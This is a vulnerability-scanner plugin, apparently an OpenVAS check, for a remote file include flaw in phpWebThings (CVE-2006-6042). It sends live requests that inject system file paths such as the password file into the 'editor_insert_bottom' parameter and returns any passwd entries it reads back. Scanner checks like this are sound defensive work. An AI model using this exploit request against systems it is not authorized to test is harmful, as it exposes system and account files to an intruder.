if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.80078" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)" );
	script_tag( name: "cvss_base", value: "6.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:P/A:P" );
	script_cve_id( "CVE-2006-6042" );
	script_bugtraq_id( 21178 );
	script_xref( name: "OSVDB", value: "30503" );
	script_name( "phpWebThings editor_insert_bottom Parameter Remote File Include Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2008 Justin Seitz" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://milw0rm.com/exploits/2811" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since
  the disclosure of this vulnerability. Likely none will be provided anymore. General solution options
  are to upgrade to a newer release, disable respective features, remove the product or replace the
  product by another one." );
	script_tag( name: "summary", value: "The remote web server is running phpWebThings, a PHP based photo
  gallery management system which is affected by a remote file include issue." );
	script_tag( name: "insight", value: "The version of phpWebThings installed on the remote host fails to
  sanitize input to the 'editor_insert_bottom' parameter before using it in the 'core/editor.php' script
  to include PHP code." );
	script_tag( name: "impact", value: "Provided PHP's 'register_globals' setting is enabled, an unauthenticated
  attacker can exploit this issue to view arbitrary files and execute arbitrary code, possibly taken from
  third-party hosts, on the remote host." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
files = traversal_files();
for dir in nasl_make_list_unique( "/phpwebthings", "/webthings", "/phpwt", "/things", http_cgi_dirs( port: port ) ) {
	install = dir;
	if(dir == "/"){
		dir = "";
	}
	for pattern in keys( files ) {
		file = "/" + files[pattern];
		req = http_get( item: NASLString( dir, "/core/editor.php?editor_insert_bottom=", file ), port: port );
		res = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
		if(res == NULL){
			continue;
		}
		if(egrep( pattern: pattern, string: res ) || ContainsString( res, NASLString( "main(", file, "): failed to open stream: No such file" ) ) || ContainsString( res, "open_basedir restriction in effect. File(" )){
			passwd = "";
			if(egrep( pattern: pattern, string: res )){
				passwd = egrep( pattern: "^[a-z_0-9$-]+:.*:[0-9]*:[0-9]*:.*:", string: res );
			}
			if( passwd ){
				info = NASLString( "The version of phpWebThings installed in directory '", install, "'\\n", "is vulnerable to this issue. Here are the contents of " + file + "\\n", "from the remote host :\\n\\n", passwd );
			}
			else {
				info = "";
			}
			security_message( data: info, port: port );
			exit( 0 );
		}
	}
}
exit( 99 );

